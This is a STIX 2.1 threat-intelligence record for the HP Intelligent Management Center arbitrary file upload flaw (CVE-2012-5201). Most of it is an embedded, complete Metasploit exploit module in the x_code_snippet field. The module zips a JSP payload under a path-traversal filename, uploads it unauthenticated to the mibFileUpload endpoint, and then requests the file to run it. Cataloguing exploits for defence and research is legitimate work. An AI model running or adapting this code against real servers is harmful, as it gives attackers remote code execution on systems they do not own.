{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b44d9ac5-bd45-47cf-b1c9-be6a6b5a2a97",
    "created": "2024-08-14T16:51:47.396909Z",
    "modified": "2024-08-14T16:51:47.396914Z",
    "name": "HP Intelligent Management Center Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in HP Intelligent Management Center. The vulnerability exists in the mibFileUpload which is accepting unauthenticated file uploads and handling zip contents in an insecure way. Combining both weaknesses a remote attacker can accomplish arbitrary file upload. This module has been tested successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_imc_mibfileupload.rb",
            "external_id": "hp_imc_mibfileupload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5201"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03689276"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP Intelligent Management Center Arbitrary File Upload',\n      'Description' => %q{\n          This module exploits a code execution flaw in HP Intelligent Management Center.\n        The vulnerability exists in the mibFileUpload which is accepting unauthenticated\n        file uploads and handling zip contents in an insecure way. Combining both weaknesses\n        a remote attacker can accomplish arbitrary file upload. This module has been tested\n        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2012-5201' ],\n          [ 'OSVDB', '91026' ],\n          [ 'BID', '58385' ],\n          [ 'ZDI', '13-050' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03689276' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Arch' => ARCH_JAVA,\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'Targets'     =>\n        [\n          [ 'HP Intelligent Management Center 5.1 E0202 / Windows', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-03-07'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc'])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, \"login.jsf\"),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # New lines are handled on the vuln app and payload is corrupted\n    jsp = payload.encoded.gsub(/\\x0d\\x0a/, \"\").gsub(/\\x0a/, \"\")\n    jsp_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n\n    # Zipping with CM_STORE to avoid errors while zip decompressing\n    # on the Java vulnerable application\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(\"../../../../../../../ROOT/#{jsp_name}\", jsp)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(zip.pack, \"application/octet-stream\", nil, \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}.zip\\\"\")\n\n    data = post_data.to_s\n\n    print_status(\"Uploading the JSP payload...\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, \"webdm\", \"mibbrowser\", \"mibFileUpload\"),\n      'method' => 'POST',\n      'data'   => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => \"JSESSIONID=#{Rex::Text.rand_text_hex(32)}\"\n    })\n\n    if res and res.code == 200 and res.body.empty?\n      print_good(\"JSP payload uploaded successfully\")\n      register_files_for_cleanup(jsp_name)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP payload upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(jsp_name),\n      'method' => 'GET'\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-07",
    "x_mitre_platforms": [
        "win'"
    ]
}